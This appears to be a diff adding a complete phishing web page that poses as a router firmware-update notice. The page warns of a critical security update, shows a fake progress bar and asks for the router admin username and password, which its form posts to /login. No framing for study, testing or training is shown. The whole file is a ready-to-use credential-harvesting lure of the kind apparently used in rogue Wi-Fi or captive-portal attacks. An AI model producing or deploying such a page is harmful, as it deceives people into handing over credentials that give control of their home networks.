@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Router Firmware Update Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fff3cd;
+display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;border-radius:12px;padding:36px;width:100%;
+max-width:440px;box-shadow:0 4px 20px rgba(0,0,0,.1);
+border-top:4px solid #ffc107}
+.alert-icon{text-align:center;font-size:3em;margin-bottom:12px}
+h1{font-size:1.15em;text-align:center;color:#856404;margin-bottom:8px}
+.msg{font-size:.85em;color:#666;text-align:center;line-height:1.5;
+margin-bottom:24px}
+.msg strong{color:#333}
+.progress-bar{background:#e9ecef;border-radius:20px;height:8px;
+margin-bottom:20px;overflow:hidden}
+.progress-fill{background:linear-gradient(90deg,#28a745,#20c997);
+height:100%;width:0;border-radius:20px;transition:width 2s ease}
+label{display:block;font-size:.8em;color:#666;margin-bottom:4px}
+input{width:100%;padding:10px 12px;border:1px solid #ced4da;
+border-radius:6px;font-size:.9em;margin-bottom:14px;outline:none}
+input:focus{border-color:#ffc107}
+button{width:100%;padding:12px;border:none;border-radius:6px;
+background:#28a745;color:#fff;font-size:.95em;font-weight:600;cursor:pointer}
+button:hover{background:#218838}
+.skip{text-align:center;margin-top:12px}
+.skip a{color:#999;text-decoration:none;font-size:.78em}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="alert-icon">&#x26A0;&#xFE0F;</div>
+<h1>Firmware Update Required</h1>
+<div class="msg">
+A critical security update is available for your router.<br>
+<strong>Please authenticate</strong> to apply the update and restore internet access.
+</div>
+<div class="progress-bar"><div class="progress-fill" id="pbar"></div></div>
+<form method="POST" action="/login">
+<label for="user">Admin Username</label>
+<input type="text" id="user" name="username" value="admin" required autocomplete="off">
+<label for="pass">Admin Password</label>
+<input type="password" id="pass" name="password" placeholder="Enter router password" required>
+<button type="submit">Update &amp; Reconnect</button>
+</form>
+<div class="skip"><a href="#">Remind me later</a></div>
+</div>
+<script>
+setTimeout(function(){document.getElementById('pbar').style.width='75%'},500);
+</script>
+</body>
+</html>
